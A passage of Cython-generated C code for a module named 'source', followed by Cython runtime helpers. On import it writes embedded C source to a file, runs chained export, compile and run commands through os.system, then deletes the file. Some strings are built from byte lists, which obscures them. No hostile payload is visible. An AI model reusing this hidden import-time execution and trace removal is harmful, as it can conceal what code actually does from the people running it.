  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_decode_bytes(__pyx_t_1, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5387, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyNumber_Add(__pyx_t_3, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5386, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_PYTHON_VERSION); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5388, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);

  
  __pyx_t_3 = PyNumber_Add(__pyx_t_1, __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 5387, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_COMPILE_FILE, __pyx_t_3) < 0) __PYX_ERR(0, 5376, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  /*with:*/ {
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_C_FILE); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 5392, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_2 = PyList_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5392, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_INCREF(__pyx_int_119);
    __Pyx_GIVEREF(__pyx_int_119);
    PyList_SET_ITEM(__pyx_t_2, 0, __pyx_int_119);
    __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5392, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_2 = __Pyx_decode_bytes(__pyx_t_1, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5392, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __pyx_t_1 = PyTuple_New(2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5392, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_GIVEREF(__pyx_t_3);
    PyTuple_SET_ITEM(__pyx_t_1, 0, __pyx_t_3);
    __Pyx_GIVEREF(__pyx_t_2);
    PyTuple_SET_ITEM(__pyx_t_1, 1, __pyx_t_2);
    __pyx_t_3 = 0;
    __pyx_t_2 = 0;
    __pyx_t_2 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_t_1, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5392, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __pyx_t_6 = __Pyx_PyObject_LookupSpecial(__pyx_t_2, __pyx_n_s_exit_2); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 5392, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __pyx_t_1 = __Pyx_PyObject_LookupSpecial(__pyx_t_2, __pyx_n_s_enter); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5392, __pyx_L3_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_3 = __Pyx_PyObject_CallNoArg(__pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 5392, __pyx_L3_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __pyx_t_1 = __pyx_t_3;
    __pyx_t_3 = 0;
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    /*try:*/ {
      {
        __Pyx_PyThreadState_declare
        __Pyx_PyThreadState_assign
        __Pyx_ExceptionSave(&__pyx_t_7, &__pyx_t_8, &__pyx_t_9);
        __Pyx_XGOTREF(__pyx_t_7);
        __Pyx_XGOTREF(__pyx_t_8);
        __Pyx_XGOTREF(__pyx_t_9);
        /*try:*/ {
          if (PyDict_SetItem(__pyx_d, __pyx_n_s_f, __pyx_t_1) < 0) __PYX_ERR(0, 5392, __pyx_L7_error)
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

          
          __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_f); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5393, __pyx_L7_error)
          __Pyx_GOTREF(__pyx_t_1);
          __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_write); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5393, __pyx_L7_error)
          __Pyx_GOTREF(__pyx_t_2);
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_C_SOURCE); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5393, __pyx_L7_error)
          __Pyx_GOTREF(__pyx_t_1);
          __pyx_t_3 = __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 5393, __pyx_L7_error)
          __Pyx_GOTREF(__pyx_t_3);
          __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

          
        }
        __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
        __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
        goto __pyx_L12_try_end;
        __pyx_L7_error:;
        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
        /*except:*/ {
          __Pyx_AddTraceback("source", __pyx_clineno, __pyx_lineno, __pyx_filename);
          if (__Pyx_GetException(&__pyx_t_3, &__pyx_t_1, &__pyx_t_2) < 0) __PYX_ERR(0, 5392, __pyx_L9_except_error)
          __Pyx_GOTREF(__pyx_t_3);
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_GOTREF(__pyx_t_2);
          __pyx_t_5 = PyTuple_Pack(3, __pyx_t_3, __pyx_t_1, __pyx_t_2); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 5392, __pyx_L9_except_error)
          __Pyx_GOTREF(__pyx_t_5);
          __pyx_t_10 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_t_5, NULL);
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
          if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 5392, __pyx_L9_except_error)
          __Pyx_GOTREF(__pyx_t_10);
          __pyx_t_4 = __Pyx_PyObject_IsTrue(__pyx_t_10);
          __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
          if (__pyx_t_4 < 0) __PYX_ERR(0, 5392, __pyx_L9_except_error)
          __pyx_t_11 = ((!(__pyx_t_4 != 0)) != 0);
          if (__pyx_t_11) {
            __Pyx_GIVEREF(__pyx_t_3);
            __Pyx_GIVEREF(__pyx_t_1);
            __Pyx_XGIVEREF(__pyx_t_2);
            __Pyx_ErrRestoreWithState(__pyx_t_3, __pyx_t_1, __pyx_t_2);
            __pyx_t_3 = 0; __pyx_t_1 = 0; __pyx_t_2 = 0; 
            __PYX_ERR(0, 5392, __pyx_L9_except_error)
          }
          __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
          __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
          goto __pyx_L8_exception_handled;
        }
        __pyx_L9_except_error:;
        __Pyx_XGIVEREF(__pyx_t_7);
        __Pyx_XGIVEREF(__pyx_t_8);
        __Pyx_XGIVEREF(__pyx_t_9);
        __Pyx_ExceptionReset(__pyx_t_7, __pyx_t_8, __pyx_t_9);
        goto __pyx_L1_error;
        __pyx_L8_exception_handled:;
        __Pyx_XGIVEREF(__pyx_t_7);
        __Pyx_XGIVEREF(__pyx_t_8);
        __Pyx_XGIVEREF(__pyx_t_9);
        __Pyx_ExceptionReset(__pyx_t_7, __pyx_t_8, __pyx_t_9);
        __pyx_L12_try_end:;
      }
    }
    /*finally:*/ {
      /*normal exit:*/{
        if (__pyx_t_6) {
          __pyx_t_9 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_tuple__3, NULL);
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 5392, __pyx_L1_error)
          __Pyx_GOTREF(__pyx_t_9);
          __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        }
        goto __pyx_L6;
      }
      __pyx_L6:;
    }
    goto __pyx_L16;
    __pyx_L3_error:;
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    goto __pyx_L1_error;
    __pyx_L16:;
  }

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_os); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5395, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_makedirs); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5395, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_os); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5395, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_path); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 5395, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_dirname); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5395, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_EXECUTE_FILE); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 5395, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_5 = __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_3); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 5395, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = PyTuple_New(1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 5395, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_GIVEREF(__pyx_t_5);
  PyTuple_SET_ITEM(__pyx_t_3, 0, __pyx_t_5);
  __pyx_t_5 = 0;
  __pyx_t_5 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 5395, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_exist_ok, Py_True) < 0) __PYX_ERR(0, 5395, __pyx_L1_error)
  __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_t_3, __pyx_t_5); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5395, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_os); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5396, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_system); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 5396, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_EXPORT_PYTHONHOME); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5396, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);

  
  __pyx_t_3 = PyList_New(4); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 5397, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_INCREF(__pyx_int_32);
  __Pyx_GIVEREF(__pyx_int_32);
  PyList_SET_ITEM(__pyx_t_3, 0, __pyx_int_32);
  __Pyx_INCREF(__pyx_int_38);
  __Pyx_GIVEREF(__pyx_int_38);
  PyList_SET_ITEM(__pyx_t_3, 1, __pyx_int_38);
  __Pyx_INCREF(__pyx_int_38);
  __Pyx_GIVEREF(__pyx_int_38);
  PyList_SET_ITEM(__pyx_t_3, 2, __pyx_int_38);
  __Pyx_INCREF(__pyx_int_32);
  __Pyx_GIVEREF(__pyx_int_32);
  PyList_SET_ITEM(__pyx_t_3, 3, __pyx_int_32);
  __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5397, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_decode_bytes(__pyx_t_1, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 5397, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyNumber_Add(__pyx_t_2, __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5396, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_EXPORT_PYTHON_EXECUTABLE); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 5398, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);

  
  __pyx_t_2 = PyNumber_Add(__pyx_t_1, __pyx_t_3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5397, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __pyx_t_3 = PyList_New(4); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 5399, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_INCREF(__pyx_int_32);
  __Pyx_GIVEREF(__pyx_int_32);
  PyList_SET_ITEM(__pyx_t_3, 0, __pyx_int_32);
  __Pyx_INCREF(__pyx_int_38);
  __Pyx_GIVEREF(__pyx_int_38);
  PyList_SET_ITEM(__pyx_t_3, 1, __pyx_int_38);
  __Pyx_INCREF(__pyx_int_38);
  __Pyx_GIVEREF(__pyx_int_38);
  PyList_SET_ITEM(__pyx_t_3, 2, __pyx_int_38);
  __Pyx_INCREF(__pyx_int_32);
  __Pyx_GIVEREF(__pyx_int_32);
  PyList_SET_ITEM(__pyx_t_3, 3, __pyx_int_32);
  __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5399, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_decode_bytes(__pyx_t_1, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 5399, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyNumber_Add(__pyx_t_2, __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5398, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_COMPILE_FILE); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 5400, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);

  
  __pyx_t_2 = PyNumber_Add(__pyx_t_1, __pyx_t_3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5399, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __pyx_t_3 = PyList_New(4); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 5401, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_INCREF(__pyx_int_32);
  __Pyx_GIVEREF(__pyx_int_32);
  PyList_SET_ITEM(__pyx_t_3, 0, __pyx_int_32);
  __Pyx_INCREF(__pyx_int_38);
  __Pyx_GIVEREF(__pyx_int_38);
  PyList_SET_ITEM(__pyx_t_3, 1, __pyx_int_38);
  __Pyx_INCREF(__pyx_int_38);
  __Pyx_GIVEREF(__pyx_int_38);
  PyList_SET_ITEM(__pyx_t_3, 2, __pyx_int_38);
  __Pyx_INCREF(__pyx_int_32);
  __Pyx_GIVEREF(__pyx_int_32);
  PyList_SET_ITEM(__pyx_t_3, 3, __pyx_int_32);
  __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5401, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_decode_bytes(__pyx_t_1, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 5401, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyNumber_Add(__pyx_t_2, __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5400, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_RUN); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 5402, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);

  
  __pyx_t_2 = PyNumber_Add(__pyx_t_1, __pyx_t_3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5401, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __pyx_t_3 = __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 5396, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_os); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 5404, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_remove); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5404, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_C_FILE); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 5404, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_5 = __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_3); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 5404, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

  
  __pyx_t_5 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_test, __pyx_t_5) < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

  /*--- Wrapped vars code ---*/

  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_5);
  if (__pyx_m) {
    if (__pyx_d) {
      __Pyx_AddTraceback("init source", __pyx_clineno, __pyx_lineno, __pyx_filename);
    }
    Py_CLEAR(__pyx_m);
  } else if (!PyErr_Occurred()) {
    PyErr_SetString(PyExc_ImportError, "init source");
  }
  __pyx_L0:;
  __Pyx_RefNannyFinishContext();
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  return (__pyx_m != NULL) ? 0 : -1;
  #elif PY_MAJOR_VERSION >= 3
  return __pyx_m;
  #else
  return;
  #endif
}

/* --- Runtime support code --- */
/* Refnanny */
#if CYTHON_REFNANNY
static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname) {
    PyObject *m = NULL, *p = NULL;
    void *r = NULL;
    m = PyImport_ImportModule(modname);
    if (!m) goto end;
    p = PyObject_GetAttrString(m, "RefNannyAPI");
    if (!p) goto end;
    r = PyLong_AsVoidPtr(p);
end:
    Py_XDECREF(p);
    Py_XDECREF(m);
    return (__Pyx_RefNannyAPIStruct *)r;
}
#endif

/* PyObjectGetAttrStr */
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name) {
    PyTypeObject* tp = Py_TYPE(obj);
    if (likely(tp->tp_getattro))
        return tp->tp_getattro(obj, attr_name);
#if PY_MAJOR_VERSION < 3
    if (likely(tp->tp_getattr))
        return tp->tp_getattr(obj, PyString_AS_STRING(attr_name));
#endif
    return PyObject_GetAttr(obj, attr_name);
}
#endif

/* GetBuiltinName */
static PyObject *__Pyx_GetBuiltinName(PyObject *name) {
    PyObject* result = __Pyx_PyObject_GetAttrStr(__pyx_b, name);
    if (unlikely(!result)) {
        PyErr_Format(PyExc_NameError,
#if PY_MAJOR_VERSION >= 3
            "name '%U' is not defined", name);
#else
            "name '%.200s' is not defined", PyString_AS_STRING(name));
#endif
    }
    return result;
}

/* Import */
static PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level) {
    PyObject *empty_list = 0;
    PyObject *module = 0;
    PyObject *global_dict = 0;
    PyObject *empty_dict = 0;
    PyObject *list;
    #if PY_MAJOR_VERSION < 3
    PyObject *py_import;
    py_import = __Pyx_PyObject_GetAttrStr(__pyx_b, __pyx_n_s_import);
    if (!py_import)
        goto bad;
    #endif
    if (from_list)
        list = from_list;
    else {
        empty_list = PyList_New(0);
        if (!empty_list)
            goto bad;
        list = empty_list;
    }
    global_dict = PyModule_GetDict(__pyx_m);
    if (!global_dict)
        goto bad;
    empty_dict = PyDict_New();
    if (!empty_dict)
        goto bad;
    {
        #if PY_MAJOR_VERSION >= 3
        if (level == -1) {
            if ((1) && (strchr(__Pyx_MODULE_NAME, '.'))) {
                module = PyImport_ImportModuleLevelObject(
                    name, global_dict, empty_dict, list, 1);
                if (!module) {
                    if (!PyErr_ExceptionMatches(PyExc_ImportError))
                        goto bad;
                    PyErr_Clear();
                }
            }
            level = 0;
        }
        #endif
        if (!module) {
            #if PY_MAJOR_VERSION < 3
            PyObject *py_level = PyInt_FromLong(level);
            if (!py_level)
                goto bad;
            module = PyObject_CallFunctionObjArgs(py_import,
                name, global_dict, empty_dict, list, py_level, (PyObject *)NULL);
            Py_DECREF(py_level);
            #else
            module = PyImport_ImportModuleLevelObject(
                name, global_dict, empty_dict, list, level);
            #endif
        }
    }
bad:
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(py_import);
    #endif
    Py_XDECREF(empty_list);
    Py_XDECREF(empty_dict);
    return module;
}

/* decode_c_bytes */
static CYTHON_INLINE PyObject* __Pyx_decode_c_bytes(
         const char* cstring, Py_ssize_t length, Py_ssize_t start, Py_ssize_t stop,
         const char* encoding, const char* errors,
         PyObject* (*decode_func)(const char *s, Py_ssize_t size, const char *errors)) {
    if (unlikely((start < 0) | (stop < 0))) {
        if (start < 0) {
            start += length;
            if (start < 0)
                start = 0;
        }
        if (stop < 0)
            stop += length;
    }
    if (stop > length)
        stop = length;
    if (unlikely(stop <= start))
        return __Pyx_NewRef(__pyx_empty_unicode);
    length = stop - start;
    cstring += start;
    if (decode_func) {
        return decode_func(cstring, length, errors);
    } else {
        return PyUnicode_Decode(cstring, length, encoding, errors);
    }
}

/* PyCFunctionFastCall */
#if CYTHON_FAST_PYCCALL
static CYTHON_INLINE PyObject * __Pyx_PyCFunction_FastCall(PyObject *func_obj, PyObject **args, Py_ssize_t nargs) {
    PyCFunctionObject *func = (PyCFunctionObject*)func_obj;
    PyCFunction meth = PyCFunction_GET_FUNCTION(func);
    PyObject *self = PyCFunction_GET_SELF(func);
    int flags = PyCFunction_GET_FLAGS(func);
    assert(PyCFunction_Check(func));
    assert(METH_FASTCALL == (flags & ~(METH_CLASS | METH_STATIC | METH_COEXIST | METH_KEYWORDS | METH_STACKLESS)));
    assert(nargs >= 0);
    assert(nargs == 0 || args != NULL);
    /* _PyCFunction_FastCallDict() must not be called with an exception set,
       because it may clear it (directly or indirectly) and so the
       caller loses its exception */
    assert(!PyErr_Occurred());
    if ((PY_VERSION_HEX < 0x030700A0) || unlikely(flags & METH_KEYWORDS)) {
        return (*((__Pyx_PyCFunctionFastWithKeywords)(void*)meth)) (self, args, nargs, NULL);
    } else {
        return (*((__Pyx_PyCFunctionFast)(void*)meth)) (self, args, nargs);
    }
}
#endif

/* PyFunctionFastCall */
#if CYTHON_FAST_PYCALL
static PyObject* __Pyx_PyFunction_FastCallNoKw(PyCodeObject *co, PyObject **args, Py_ssize_t na,
                                               PyObject *globals) {
    PyFrameObject *f;
    PyThreadState *tstate = __Pyx_PyThreadState_Current;
    PyObject **fastlocals;
    Py_ssize_t i;
    PyObject *result;
    assert(globals != NULL);
    /* XXX Perhaps we should create a specialized
       PyFrame_New() that doesn't take locals, but does
       take builtins without sanity checking them.
       */
    assert(tstate != NULL);
    f = PyFrame_New(tstate, co, globals, NULL);
    if (f == NULL) {
        return NULL;
    }
    fastlocals = __Pyx_PyFrame_GetLocalsplus(f);
    for (i = 0; i < na; i++) {
        Py_INCREF(*args);
        fastlocals[i] = *args++;
    }
    result = PyEval_EvalFrameEx(f,0);
    ++tstate->recursion_depth;
    Py_DECREF(f);
    --tstate->recursion_depth;
    return result;
}
#if 1 || PY_VERSION_HEX < 0x030600B1
static PyObject *__Pyx_PyFunction_FastCallDict(PyObject *func, PyObject **args, Py_ssize_t nargs, PyObject *kwargs) {
    PyCodeObject *co = (PyCodeObject *)PyFunction_GET_CODE(func);
